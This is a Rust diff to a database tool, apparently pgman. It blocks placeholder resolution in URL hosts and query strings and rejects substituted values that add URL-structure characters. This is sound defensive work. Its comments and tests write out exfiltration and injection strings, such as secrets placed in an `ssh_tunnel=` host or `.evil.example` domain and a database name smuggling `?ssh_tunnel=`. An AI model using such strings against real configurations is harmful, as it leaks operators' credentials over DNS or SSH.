@@ -434,8 +434,18 @@ pub struct UrlResolution {
     /// Placeholder bodies that `lookup` couldn't resolve (an unset name
     /// with no default, or a nested/malformed placeholder).
     pub missing: Vec<String>,
-    /// Placeholder bodies sitting where the host or port goes. These
-    /// are **never** resolved, whatever the environment holds.
+    /// Placeholder bodies that must **never** be resolved into this
+    /// URL, whatever the environment holds:
+    ///
+    /// - one standing where the host or port goes (the value would
+    ///   leave the machine as a DNS lookup to a domain the config
+    ///   file chose);
+    /// - one standing in the query string (`?ssh_tunnel=${X}` names
+    ///   the bastion pgman would spawn `ssh` to, and `?sslmode=${X}`
+    ///   picks the transport security);
+    /// - every body in the URL when a *permitted* substitution would
+    ///   have changed the URL's structure — see
+    ///   [`introduces_url_structure`].
     pub in_host: Vec<String>,
 }
 
@@ -453,12 +463,26 @@ impl UrlResolution {
 /// the checkout chooses both the placeholder names and the domain they
 /// sit under. `url: jdbc:postgresql://${AWS_SECRET_ACCESS_KEY}.example
 /// .com/db` exfiltrates the operator's credential over DNS the moment
-/// pgman resolves it — no Postgres server needed, just a lookup. So
-/// resolution is allowed for the userinfo (username / password), the
-/// path (database name) and the query string, and refused outright for
-/// the `host[:port]` component. A placeholder there is reported in
+/// pgman resolves it — no Postgres server needed, just a lookup.
+///
+/// So resolution is allowed in exactly two places — the userinfo
+/// (username / password) and the path (database *name*) — and refused
+/// everywhere else: the `host[:port]` component **and the query
+/// string**. The query string is not decoration: `conn::Dsn::parse`
+/// reads `ssh_tunnel=` out of it and pgman will spawn `ssh` to that
+/// target, so `?ssh_tunnel=${SECRET}.evil.example` was the same
+/// exfiltration hole in a different component (and `sslmode=` picks
+/// the transport security). A placeholder in either is reported in
 /// `in_host` and left as literal text, which stops the pick from being
 /// connected to at all (`App::refuse_if_unresolved`).
+///
+/// Resolution in the two permitted places is additionally structural:
+/// a value that would introduce a `?`, `&`, `/`, `@` or `=` is refused
+/// (see [`introduces_url_structure`]), because a database name of
+/// `db?ssh_tunnel=x.evil.com` reaches the same tunnel through the one
+/// component this function *does* resolve. There is no partial
+/// outcome — the whole URL is refused and every body in it reported,
+/// so no half-resolved string can be connected to.
 ///
 /// A URL with no `://` at all — `url: ${SPRING_DATASOURCE_URL}`, or
 /// `${PREFIX}//host/db` — has no identifiable host component, so *every*
@@ -491,6 +515,12 @@ pub fn resolve_url_placeholders(
     let authority_len = rest.find(['/', '?', '#']).unwrap_or(rest.len());
     let authority = &rest[..authority_len];
     let tail = &rest[authority_len..];
+    // Split the database name off the query string / fragment. Only
+    // the name is resolvable; the params are not — `ssh_tunnel=` and
+    // `sslmode=` live there (see the doc comment).
+    let path_len = tail.find(['?', '#']).unwrap_or(tail.len());
+    let path = &tail[..path_len];
+    let params = &tail[path_len..];
     // Split userinfo from host[:port] at the last `@` that isn't inside
     // a `${…}` (a placeholder's default value may contain one).
     let (userinfo, hostport) = match last_top_level_at(authority) {
@@ -498,33 +528,68 @@ pub fn resolve_url_placeholders(
         None => ("", authority),
     };
 
+    // host[:port] and the params: never resolved.
+    let mut in_host = placeholder_bodies(hostport);
+    in_host.extend(placeholder_bodies(params));
+
     let mut missing = Vec::new();
-    let mut value = String::from(scheme);
     // Userinfo: resolved. A password or username from the environment
     // reaches only the server named by the (literal) host.
-    match resolve_placeholders(userinfo, &lookup) {
-        Ok(v) => value.push_str(&v),
+    let resolved_userinfo = match resolve_placeholders(userinfo, &lookup) {
+        Ok(v) => v,
         Err(m) => {
-            value.push_str(userinfo);
             missing.extend(m);
+            userinfo.to_string()
         }
-    }
-    // host[:port]: never resolved.
-    let in_host = placeholder_bodies(hostport);
-    value.push_str(hostport);
-    // Path (database name) + query: resolved.
-    match resolve_placeholders(tail, &lookup) {
-        Ok(v) => value.push_str(&v),
+    };
+    // Path (database name): resolved.
+    let resolved_path = match resolve_placeholders(path, &lookup) {
+        Ok(v) => v,
         Err(m) => {
-            value.push_str(tail);
             missing.extend(m);
+            path.to_string()
         }
+    };
+    // Structural check: a value that adds a `?`, `&`, `/`, `@` or `=`
+    // reaches past the component it was substituted into — a dbname of
+    // `db?ssh_tunnel=x.evil.com`, a username of `me@evil.example`.
+    // Refuse the whole URL rather than any part of it.
+    if introduces_url_structure(userinfo, &resolved_userinfo)
+        || introduces_url_structure(path, &resolved_path)
+    {
+        return UrlResolution {
+            value: url.to_string(),
+            missing: Vec::new(),
+            in_host: placeholder_bodies(url),
+        };
     }
     UrlResolution {
-        value,
+        value: format!("{scheme}{resolved_userinfo}{hostport}{resolved_path}{params}"),
         missing,
         in_host,
     }
+}
+
+/// URL characters that move a component boundary: `?` opens the query
+/// string, `&` starts another param, `=` splits a param's key from its
+/// value, `/` ends the authority (or extends the path), `@` ends the
+/// userinfo. A resolved placeholder may only fill the component it
+/// sits in, so introducing any of these is refused.
+const URL_STRUCTURE_CHARS: [char; 5] = ['?', '&', '/', '@', '='];
+
+/// True when substituting placeholders turned `template` into
+/// `resolved` by *adding* one of [`URL_STRUCTURE_CHARS`]. Counted per
+/// character rather than tested for presence, so a template that
+/// legitimately carries one (`/${DB_NAME}` always has a `/`) still
+/// catches a value that brings a second.
+///
+/// The consequence for a legitimate password holding one of these is
+/// that it has to be percent-encoded — which a URL userinfo requires
+/// anyway.
+fn introduces_url_structure(template: &str, resolved: &str) -> bool {
+    URL_STRUCTURE_CHARS
+        .iter()
+        .any(|c| resolved.matches(*c).count() > template.matches(*c).count())
 }
 
 /// Every `${…}` body in `s`, in order. An unterminated `${` yields the
@@ -1125,6 +1190,55 @@ dataSource:
             vec!["SCHEME".to_string(), "DB_USER".to_string()]
         );
         assert_eq!(got.value, "${SCHEME}://${DB_USER}@host/db");
+    }
+
+    #[test]
+    fn resolve_url_placeholders_never_resolves_a_url_parameter() {
+        // `ssh_tunnel=` is read out of the query string by
+        // `conn::Dsn::parse` and pgman spawns `ssh` to it. Resolving a
+        // placeholder there is the host hole in another component:
+        // the secret leaves the machine as the bastion's hostname.
+        let got = resolve_url_placeholders(
+            "jdbc:postgresql://localhost:5432/app?ssh_tunnel=${SECRET}.evil.example",
+            |n| (n == "SECRET").then(|| "hunter2".to_string()),
+        );
+        assert_eq!(got.in_host, vec!["SECRET".to_string()]);
+        assert!(!got.is_clean());
+        assert_eq!(
+            got.value, "jdbc:postgresql://localhost:5432/app?ssh_tunnel=${SECRET}.evil.example",
+            "the param must stay literal — a resolved one is connectable"
+        );
+        assert!(
+            !got.value.contains("hunter2"),
+            "the resolved value must never reach the URL: {got:?}"
+        );
+    }
+
+    #[test]
+    fn resolve_url_placeholders_refuses_a_dbname_that_resolves_into_a_parameter() {
+        // The database name IS resolvable — so the env-controlled way
+        // to reach the same tunnel is to smuggle a `?` through it.
+        let got = resolve_url_placeholders("jdbc:postgresql://localhost:5432/${DB_NAME}", |n| {
+            (n == "DB_NAME").then(|| "db?ssh_tunnel=x.evil.com".to_string())
+        });
+        assert!(!got.is_clean(), "must be refused: {got:?}");
+        assert_eq!(got.in_host, vec!["DB_NAME".to_string()]);
+        assert_eq!(
+            got.value, "jdbc:postgresql://localhost:5432/${DB_NAME}",
+            "a refused URL keeps its literal text — no half-resolved DSN"
+        );
+        assert!(!got.value.contains("evil.com"));
+    }
+
+    #[test]
+    fn resolve_url_placeholders_refuses_a_username_that_resolves_past_the_at() {
+        // `@` in the value moves the userinfo/host split, so the value
+        // chooses the host after all.
+        let got = resolve_url_placeholders("jdbc:postgresql://${DB_USER}@db/orders", |n| {
+            (n == "DB_USER").then(|| "me@evil.example".to_string())
+        });
+        assert!(!got.is_clean(), "must be refused: {got:?}");
+        assert_eq!(got.value, "jdbc:postgresql://${DB_USER}@db/orders");
     }
 
     #[test]
